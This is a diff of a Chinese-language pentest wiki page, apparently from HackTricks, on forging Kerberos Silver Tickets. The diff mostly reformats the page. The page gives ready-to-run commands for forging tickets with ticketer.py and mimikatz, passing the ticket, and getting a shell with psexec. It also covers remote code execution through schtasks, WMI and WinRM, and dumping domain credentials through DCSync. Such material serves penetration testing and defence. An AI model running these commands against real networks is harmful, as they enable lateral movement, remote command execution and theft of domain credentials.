@@ -1,4 +1,4 @@
-# 银票据
+# Silver Ticket
 
 <details>
 
@@ -16,7 +16,7 @@
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**赏金提示**：**注册**Intigriti，这是一家由黑客创建的高级**赏金平台**！今天加入我们，开始赚取高达**$100,000**的赏金！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)
+**赏金提示**：**注册**Intigriti，这是一家由黑客创建的高级**赏金平台**！今天加入我们，开始赚取高达\*\*$100,000\*\*的赏金！[**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
@@ -27,12 +27,15 @@
 对于票据制作，根据操作系统使用不同的工具：
 
 ### 在Linux
+
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
+
 ### 在Windows上
+
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -44,20 +47,21 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+
 CIFS服务被强调为访问受害者文件系统的常见目标，但其他服务如HOST和RPCSS也可以被利用来执行任务和WMI查询。
 
 ## 可用服务
 
-| 服务类型                                  | 服务银票                                                     |
-| ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell远程                              | <p>HOST</p><p>HTTP</p><p>根据操作系统不同还有：</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>在某些情况下，您可以直接请求：WINRM</p> |
-| 计划任务                            | HOST                                                                       |
-| Windows文件共享，也包括psexec            | CIFS                                                                       |
-| LDAP操作，包括DCSync           | LDAP                                                                       |
-| Windows远程服务器管理工具 | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| 黄金票证                             | krbtgt                                                                     |
+| 服务类型                  | 服务银票                                                             |
+| --------------------- | ---------------------------------------------------------------- |
+| WMI                   | <p>HOST</p><p>RPCSS</p>                                          |
+| PowerShell远程          | <p>HOST</p><p>HTTP</p><p>根据操作系统不同还有：</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                 | <p>HOST</p><p>HTTP</p><p>在某些情况下，您可以直接请求：WINRM</p>                |
+| 计划任务                  | HOST                                                             |
+| Windows文件共享，也包括psexec | CIFS                                                             |
+| LDAP操作，包括DCSync       | LDAP                                                             |
+| Windows远程服务器管理工具      | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                               |
+| 黄金票证                  | krbtgt                                                           |
 
 使用**Rubeus**，您可以使用以下参数请求所有这些票证：
 
@@ -76,14 +80,17 @@ CIFS服务被强调为访问受害者文件系统的常见目标，但其他服�
 ### CIFS
 
 有了这张票，您就可以通过**SMB**访问`C$`和`ADMIN$`文件夹（如果它们被公开），并通过执行类似以下操作将文件复制到远程文件系统的某个位置：
+
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
+
 ### 主机
 
 有了这个权限，您可以在远程计算机中生成计划任务并执行任意命令：
+
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -95,9 +102,11 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
+
 ### 主机 + RPCSS
 
 使用这些票据，您可以在受害系统中执行 WMI：
+
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -107,24 +116,29 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
+
 在以下页面查找有关**wmiexec的更多信息**：
 
-{% content-ref url="../ntlm/wmicexec.md" %}
-[wmicexec.md](../ntlm/wmicexec.md)
+{% content-ref url="../lateral-movement/wmicexec.md" %}
+[wmicexec.md](../lateral-movement/wmicexec.md)
 {% endcontent-ref %}
 
 ### 主机 + WSMAN (WINRM)
 
 通过计算机上的winrm访问，您可以**访问它**，甚至获取PowerShell：
+
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
+
 ### LDAP
 
 拥有这个权限后，您可以使用**DCSync**来转储域控制器数据库：
+
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+
 **了解更多关于DCSync**请查看以下页面：
 
 ## 参考资料
@@ -138,7 +152,7 @@ mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.loc
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**漏洞赏金提示**：**注册**Intigriti，一个由黑客创建的高级**漏洞赏金平台**！立即加入我们，访问 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达**$100,000**的赏金！
+**漏洞赏金提示**：**注册**Intigriti，一个由黑客创建的高级**漏洞赏金平台**！立即加入我们，访问 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)，开始赚取高达\*\*$100,000\*\*的赏金！
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
